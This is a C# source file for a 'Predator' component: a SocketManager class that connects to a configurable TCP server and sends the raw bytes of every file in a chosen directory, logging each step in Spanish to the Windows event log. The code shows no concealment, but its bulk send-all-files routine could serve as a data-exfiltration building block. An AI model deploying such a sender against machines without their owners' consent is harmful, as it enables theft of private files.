using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Predator.Components
{
    internal class SocketManager
    {
        private string server;
        private int port;
        private Socket socketClient;
        private readonly EventLog eventLog = new EventLog("Application") { Source = "Predator" };

        public SocketManager(string server, int port)
        {
            this.server = server;
            this.port = port;
        }

        public void Connect()
        {
            try
            {
                socketClient = new Socket(SocketType.Stream, ProtocolType.Tcp);
                socketClient.Connect(this.server, this.port);
                eventLog.WriteEntry("Conexión establecida con el servidor", EventLogEntryType.Information);
            }
            catch (Exception ex)
            {
                eventLog.WriteEntry("Error al conectar con el servidor: " + ex.Message, EventLogEntryType.Error);
            }
        }

        public void Disconnect()
        {
            try
            {
                socketClient.Close();
                eventLog.WriteEntry("Conexión cerrada con el servidor", EventLogEntryType.Information);
            }
            catch (Exception ex)
            {
                eventLog.WriteEntry("Error al cerrar la conexión con el servidor: " + ex.Message, EventLogEntryType.Error);
            }
        }

        public void SendAllFilesOfDirectory(string pathDirectorySource)
        {
            var files = Directory.GetFiles(pathDirectorySource);
            foreach (var file in files)
            {
                SendFile(file);
            }
        }

        public void SendFile(string pathFile)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(pathFile);
                socketClient.Send(fileData);
                eventLog.WriteEntry("Archivo enviado: " + pathFile, EventLogEntryType.Information);
            }
            catch (Exception ex)
            {
                eventLog.WriteEntry("Error al enviar el archivo: " + pathFile + ". Error: " + ex.Message, EventLogEntryType.Error);
            }
        }
    }
}